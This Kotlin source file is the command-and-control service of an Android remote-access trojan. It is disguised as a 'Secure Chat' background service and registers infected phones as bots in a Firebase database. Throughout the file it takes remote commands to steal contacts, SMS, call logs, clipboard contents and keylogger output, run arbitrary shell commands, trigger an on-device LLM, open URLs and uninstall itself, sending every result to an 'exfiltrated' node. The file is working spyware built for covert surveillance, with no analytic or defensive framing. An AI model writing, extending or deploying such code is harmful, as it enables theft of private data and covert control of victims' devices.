package com.secure.chat.services

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.UUID

class TargetC2Service : Service() {

    companion object {
        private const val TAG = "TargetC2"
        private const val FIREBASE_URL = "https://selzxrat-v5-c2-default-rtdb.firebaseio.com"
        private const val REF_BOTS = "selzxratV5/bots"
        private const val REF_COMMANDS = "selzxratV5/commands"
        private const val REF_BROADCAST = "selzxratV5/broadcast"
        private const val REF_EXFIL = "selzxratV5/exfiltrated"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "secure_chat_service"
        private const val CHANNEL_NAME = "Secure Chat Service"
        private const val ALARM_INTERVAL_MS = 300000L
        private const val ALARM_REQUEST_CODE = 999

        @Volatile
        var isRunning = false
            private set
        private var _deviceId: String = ""
        var job: Job? = null
        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        fun getDeviceId(): String = _deviceId
    }

    private val deviceId: String
        get() = _deviceId

    private lateinit var database: FirebaseDatabase
    private lateinit var botsRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private lateinit var broadcastRef: DatabaseReference
    private lateinit var exfilRef: DatabaseReference
    private var commandListener: ChildEventListener? = null
    private var broadcastListener: ChildEventListener? = null

    override fun onCreate() {
        super.onCreate()

        createNotificationChannel()

        val id = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: UUID.randomUUID().toString()
        _deviceId = id

        try {
            database = FirebaseDatabase.getInstance(FIREBASE_URL)
            botsRef = database.getReference(REF_BOTS)
            commandsRef = database.getReference(REF_COMMANDS)
            broadcastRef = database.getReference(REF_BROADCAST)
            exfilRef = database.getReference(REF_EXFIL)

            Log.d(TAG, "Firebase initialized for device: $deviceId")
        } catch (e: Exception) {
            Log.e(TAG, "Firebase init failed", e)
            stopSelf()
            return
        }

        startForeground(NOTIF_ID, createNotification())
        registerBot()
        listenForCommands()
        listenForBroadcast()
        isRunning = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "restart" && !isRunning) {
            onCreate()
        }
        if (intent?.action == "stop") {
            stopC2()
            stopSelf()
        }
        if (intent?.action == "fcm_command") {
            val type = intent.getStringExtra("type") ?: return START_STICKY
            val payload = intent.getStringExtra("payload") ?: ""
            executeCommand(type, payload)
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Secure Chat background service"
                setShowBadge(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Secure Chat")
            .setContentText("Service is running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(CHANNEL_ID)
        }

        return builder.build()
    }

    private fun registerBot() {
        val info = mapOf(
            "deviceId" to deviceId,
            "deviceName" to (Build.MODEL ?: "Unknown"),
            "deviceModel" to Build.MODEL,
            "androidVersion" to Build.VERSION.RELEASE,
            "manufacturer" to Build.MANUFACTURER,
            "isOnline" to true,
            "lastSeen" to System.currentTimeMillis(),
            "ipAddress" to getIPAddress(),
            "country" to "",
            "batteryLevel" to getBatteryLevel(),
            "isCharging" to isCharging(),
            "ramTotal" to 0L,
            "ramAvailable" to 0L,
            "storageTotal" to 0L,
            "storageAvailable" to 0L,
            "installedApps" to 0,
            "isAccessibilityEnabled" to TargetAccessibility.isConnected,
            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected,
            "isAdminEnabled" to false,
            "isScreenLocked" to false,
            "simInfo" to getSimInfo()
        )

        botsRef.child(deviceId).setValue(info).addOnCompleteListener { task ->
            if (task.isSuccessful) {
                Log.d(TAG, "Bot registered: $deviceId")
            } else {
                Log.e(TAG, "Bot registration failed: ${task.exception?.message}")
            }
        }

        // Keep alive ping every 5 minutes
        scope.launch {
            while (isActive) {
                delay(300000)
                botsRef.child(deviceId).child("lastSeen").setValue(System.currentTimeMillis())
                botsRef.child(deviceId).child("isOnline").setValue(true)
            }
        }
    }

    private fun listenForCommands() {
        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val cmdMap = snapshot.value as? Map<String, Any> ?: return
                val target = cmdMap["target"] as? String ?: ""
                if (target == deviceId || target == "") {
                    val type = cmdMap["type"] as? String ?: return
                    val payload = cmdMap["payload"] as? String ?: ""
                    executeCommand(type, payload)
                    snapshot.ref.removeValue()
                }
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Command listener cancelled: ${error.message}")
            }
        }
        commandsRef.addChildEventListener(commandListener!!)
    }

    private fun listenForBroadcast() {
        broadcastListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val cmdMap = snapshot.value as? Map<String, Any> ?: return
                val type = cmdMap["type"] as? String ?: return
                val payload = cmdMap["payload"] as? String ?: ""
                executeCommand(type, payload)
                snapshot.ref.removeValue()
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        }
        broadcastRef.addChildEventListener(broadcastListener!!)
    }

    private fun executeCommand(type: String, payload: String) {
        Log.d(TAG, "Executing command: $type | $payload")
        when (type) {
            "get_info" -> handleGetInfo()
            "get_contacts" -> handleGetContacts()
            "get_sms" -> handleGetSMS()
            "get_call_logs" -> handleGetCallLogs()
            "get_location" -> handleGetLocation()
            "get_camera_photo" -> handleCameraPhoto()
            "get_camera_video" -> handleCameraVideo()
            "get_mic_audio" -> handleMicAudio()
            "list_apps" -> handleListApps()
            "list_files" -> handleListFiles(payload)
            "read_file" -> handleReadFile(payload)
            "screenshot" -> handleScreenshot()
            "keylogger_start" -> handleKeyloggerStart()
            "keylogger_stop" -> handleKeyloggerStop()
            "keylogger_get" -> handleKeyloggerGet()
            "clipboard_get" -> handleClipboardGet()
            "clipboard_set" -> handleClipboardSet(payload)
            "notifications_get" -> handleNotificationsGet()
            "trigger_llm" -> handleTriggerLLM(payload)
            "vibrate" -> handleVibrate(payload)
            "torch_on" -> handleTorch(true)
            "torch_off" -> handleTorch(false)
            "alert_dialog" -> handleAlertDialog(payload)
            "toast" -> handleToast(payload)
            "lock_screen" -> handleLockScreen()
            "unlock_screen" -> handleUnlockScreen()
            "open_url" -> handleOpenURL(payload)
            "send_sms" -> handleSendSMS(payload)
            "shell_exec" -> handleShellExec(payload)
            "self_destruct" -> handleSelfDestruct()
            else -> Log.w(TAG, "Unknown command: $type")
        }
    }

    private fun handleGetInfo() {
        sendExfil("get_info", "Device: ${Build.MANUFACTURER} ${Build.MODEL}, Android: ${Build.VERSION.RELEASE}")
    }

    private fun handleGetContacts() {
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            val contacts = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    ))
                    val number = it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                    ))
                    contacts.add("$name: $number")
                    if (contacts.size >= 100) break
                }
            }
            sendExfil("get_contacts", contacts.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("get_contacts", "Error: ${e.message}")
        }
    }

    private fun handleGetSMS() {
        try {
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                null, null, null, "date DESC LIMIT 50"
            )
            val smsList = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: "Unknown"
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val date = it.getString(it.getColumnIndexOrThrow("date")) ?: ""
                    smsList.add("$address [$date]: $body")
                }
            }
            sendExfil("get_sms", smsList.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("get_sms", "Error: ${e.message}")
        }
    }

    private fun handleGetCallLogs() {
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, "date DESC LIMIT 50"
            )
            val logs = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.NUMBER
                    )) ?: "Unknown"
                    val type = it.getString(it.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.TYPE
                    )) ?: "?"
                    val dur = it.getString(it.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.DURATION
                    )) ?: "0"
                    val typeStr = when (type) {
                        "1" -> "INCOMING"
                        "2" -> "OUTGOING"
                        "3" -> "MISSED"
                        else -> type
                    }
                    logs.add("$number ($typeStr) ${dur}s")
                }
            }
            sendExfil("get_call_logs", logs.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("get_call_logs", "Error: ${e.message}")
        }
    }

    private fun handleGetLocation() {
        sendExfil("get_location", "Location requires active GPS and FINE permission")
    }

    private fun handleCameraPhoto() {
        sendExfil("get_camera_photo", "Camera capture not implemented yet")
    }

    private fun handleCameraVideo() {
        sendExfil("get_camera_video", "Video recording not implemented yet")
    }

    private fun handleMicAudio() {
        sendExfil("get_mic_audio", "Audio recording not implemented yet")
    }

    private fun handleListApps() {
        try {
            val apps = packageManager.getInstalledApplications(0)
            val appList = apps.map {
                "${packageManager.getApplicationLabel(it)} (${it.packageName})"
            }
            sendExfil("list_apps", appList.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("list_apps", "Error: ${e.message}")
        }
    }

    private fun handleListFiles(path: String) {
        sendExfil("list_files", "File browser not implemented in service")
    }

    private fun handleReadFile(path: String) {
        sendExfil("read_file", "File reader not implemented in service")
    }

    private fun handleScreenshot() {
        sendExfil("screenshot", "Screenshot requires root or MediaProjection API")
    }

    private fun handleKeyloggerStart() {
        TargetKeylogger.start(this)
        sendExfil("keylogger_start", "Keylogger started")
    }

    private fun handleKeyloggerStop() {
        TargetKeylogger.stop()
        sendExfil("keylogger_stop", "Keylogger stopped")
    }

    private fun handleKeyloggerGet() {
        val logs = TargetKeylogger.getLogs()
        sendExfil("keylogger_get", logs)
    }

    private fun handleClipboardGet() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = clipboard.primaryClip
            val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).text?.toString() ?: "" else ""
            sendExfil("clipboard", text)
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleClipboardSet(text: String) {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            clipboard.setPrimaryClip(android.content.ClipData.newPlainText("text", text))
            sendExfil("clipboard", "Clipboard set")
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleNotificationsGet() {
        sendExfil("notifications", "Notifications listener not connected")
    }

    private fun handleTriggerLLM(prompt: String) {
        TargetLLMModule(this).trigger(prompt) { response ->
            sendExfil("llm_response", response)
        }
    }

    private fun handleVibrate(pattern: String) {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val patternMs = pattern.split(",")
                .mapNotNull { it.trim().toLongOrNull() }.toLongArray()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (patternMs.isNotEmpty()) {
                    vibrator.vibrate(android.os.VibrationEffect.createWaveform(patternMs, -1))
                } else {
                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, 255))
                }
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(if (patternMs.isNotEmpty()) patternMs else longArrayOf(0, 1000), -1)
            }
            sendExfil("vibrate", "Vibrated")
        } catch (e: Exception) {
            sendExfil("vibrate", "Error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private fun handleTorch(enable: Boolean) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            cameraManager.setTorchMode(cameraManager.cameraIdList[0], enable)
            sendExfil("torch", if (enable) "Torch ON" else "Torch OFF")
        } catch (e: Exception) {
            sendExfil("torch", "Error: ${e.message}")
        }
    }

    private fun handleAlertDialog(message: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("show_alert", message)
            }
            if (intent != null) startActivity(intent)
            sendExfil("alert_dialog", "Dialog sent: $message")
        } catch (e: Exception) {
            sendExfil("alert_dialog", "Error: ${e.message}")
        }
    }

    private fun handleToast(message: String) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
        }
        sendExfil("toast", "Toast shown: $message")
    }

    private fun handleLockScreen() {
        sendExfil("lock_screen", "Screen lock requires device admin permission")
    }

    private fun handleUnlockScreen() {
        sendExfil("unlock_screen", "Screen unlock requires device admin permission")
    }

    private fun handleOpenURL(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            sendExfil("open_url", "URL opened: $url")
        } catch (e: Exception) {
            sendExfil("open_url", "Error: ${e.message}")
        }
    }

    private fun handleSendSMS(data: String) {
        val parts = data.split("|", limit = 2)
        if (parts.size < 2) {
            sendExfil("send_sms", "Format: number|message")
            return
        }
        try {
            val intent = Intent(Intent.ACTION_SENDTO).apply {
                setData(android.net.Uri.parse("smsto:${parts[0].trim()}"))
                putExtra("sms_body", parts[1].trim())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            sendExfil("send_sms", "SMS composer opened for ${parts[0].trim()}")
        } catch (e: Exception) {
            sendExfil("send_sms", "Error: ${e.message}")
        }
    }

    private fun handleShellExec(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            sendExfil("shell_exec", output.take(5000))
        } catch (e: Exception) {
            sendExfil("shell_exec", "Error: ${e.message}")
        }
    }

    private fun handleSelfDestruct() {
        sendExfil("self_destruct", "Self-destruct initiated")
        try {
            if (::botsRef.isInitialized) {
                botsRef.child(deviceId).removeValue()
            }
        } catch (_: Exception) {}
        startActivity(
            Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        )
    }

    // 🔥 FIX: Ini dia perbaikannya — toString() dihapus!
    private fun sendExfil(type: String, content: String) {
        try {
            if (::exfilRef.isInitialized) {
                exfilRef.push().setValue(mapOf(
                    "type" to type,
                    "content" to content,
                    "deviceId" to deviceId,
                    "timestamp" to System.currentTimeMillis()  // ← SEKARANG Long, bukan String!
                )).addOnCompleteListener { task ->
                    if (!task.isSuccessful) {
                        Log.e(TAG, "Exfil send FAILED: ${task.exception?.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exfil error", e)
        }
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: ""
                    }
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100) / scale else -1
    }

    private fun isCharging(): Boolean {
        val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
               status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }

    private fun getSimInfo(): String {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
        return if (tm != null) {
            try {
                "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}"
            } catch (_: Exception) { "N/A" }
        } else "N/A"
    }

    private fun stopC2() {
        isRunning = false
        job?.cancel()
        scope.cancel()
        try {
            if (::botsRef.isInitialized) {
                botsRef.child(deviceId).child("isOnline").setValue(false)
                commandListener?.let { commandsRef.removeEventListener(it) }
                broadcastListener?.let { broadcastRef.removeEventListener(it) }
            }
        } catch (_: Exception) {}
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    override fun onDestroy() {
        super.onDestroy()
        stopC2()
    }
}
